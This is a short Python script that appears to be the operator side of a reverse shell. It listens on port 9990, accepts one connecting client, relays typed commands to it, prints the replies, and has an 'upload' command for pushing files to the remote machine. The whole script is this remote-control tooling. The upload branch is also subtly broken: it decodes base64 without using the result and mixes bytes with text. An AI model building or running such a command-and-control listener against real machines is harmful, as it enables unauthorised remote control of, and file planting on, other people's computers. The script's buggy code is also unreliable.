from  datetime import datetime
import json
import socket 
import base64
from typing import List
from array import *

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("0.0.0.0", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()
print(f"[+] Got a connection from {remote_address} ")

try:

    while True:
        command :str = input(">> ")
        
        
        if "upload" in command:
            command_name, path_in_server, path_in_client = command.split(' ')
            with open(path_in_server, '+rb') as file:
                data = file.read()
            b4 = base64.b64decode(data)

            command_on_client :str = command_name + path_in_server
            cl_socket.send(command_on_client.encode()+' ' +data)

        else:
            cl_socket.send(command.encode())
            response = cl_socket.recv(1024).decode()
            print(response)

        
        #mas: array = array()
        #массив передовать
        
except KeyboardInterrupt:
    listener.close()
    exit()